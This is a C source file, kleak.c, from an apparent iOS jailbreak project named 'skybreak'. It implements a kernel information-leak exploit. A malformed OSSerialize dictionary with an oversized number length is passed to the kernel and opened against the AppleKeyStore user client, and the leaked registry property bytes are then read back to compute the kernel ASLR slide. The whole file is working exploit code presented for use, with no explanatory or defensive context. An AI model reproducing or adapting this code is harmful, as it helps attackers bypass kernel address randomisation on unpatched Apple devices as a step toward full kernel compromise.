//
//  kleak.c
//  skybreak
//
//  Created by Cryptic on 1/8/18.
//  Updated by Cryptic on 2/16/19
//  Copyright © 2019 Cryptic. All rights reserved.
//

#include <mach/mach.h>
#include <IOKit/IOKitLib.h>
#include <IOKit/iokitmig.h>
#include <stdio.h>
#include "exploit.h"
#include "common.h"

uint32_t get_kslide(void)
{
    uint32_t addr = 0x80099735;
    uint32_t kslide;
    
    uint32_t malDict[] =
    {
        0x000000d3,
        kOSSerializeEndCollecton | kOSSerializeDictionary | 2,
        kOSSerializeSymbol | 4,
        0x00414141,
        kOSSerializeEndCollecton | kOSSerializeNumber | 0x200,
        0x41414141,
        0x41414141
    };
    
    size_t idx = sizeof(malDict);
    io_service_t service = MACH_PORT_NULL;
    io_connect_t connect = MACH_PORT_NULL;
    io_iterator_t iterate = MACH_PORT_NULL;
    
    mach_port_t master_port = MACH_PORT_NULL, result = MACH_PORT_NULL;
    kern_return_t kr = -1;
    
    host_get_io_master(mach_host_self(), &master_port);
    
    kr = io_service_get_matching_services_bin(master_port, (char*)malDict, idx, &result);
    
    KERN_LOG("Dictionary is valid", "Dictionary is invalid", result, kr);
    
    service = IOServiceGetMatchingService(master_port, IOServiceMatching("AppleKeyStore"));
    
    io_service_open_extended(service, mach_task_self(), 0, NDR_record, (io_buf_ptr_t) malDict, idx, &kr, &connect);
    
    KERN_LOG("UserClient spawned successfully", "UserClient failed", connect, kr)
    
    kr = IORegistryEntryCreateIterator(service, "IOService", kIORegistryIterateRecursively, &iterate);
    
    KERN_LOG("Successfully created iterator", "Failed to create iterator", iterate, kr)
    
    io_object_t object = MACH_PORT_NULL;
    
    uint32_t bytes = 0x0;
    char buf[0x200] = { 0x0 };
    
    while(bytes == 0)
    {
        if(object)
        {
            IOObjectRelease(object);
        }
        object = IOIteratorNext(iterate);
        
        mach_msg_type_number_t bufCount = 0x200;
        
        io_registry_entry_get_property_bytes(object, "AAA", (char*)&buf, &bufCount);
        
        bytes = *(uint32_t*)(buf);
        
    }
    
    kslide = ((*(uint32_t*)(buf + 36)) - addr);
    
    if(kslide)
    {
        printf("Successfully leaked kslide: 0x%X\n", kslide);
        return kslide;
    }
    printf("Error: Failed to leak kslide: 0x%X\n", kslide);
    return -1;
}
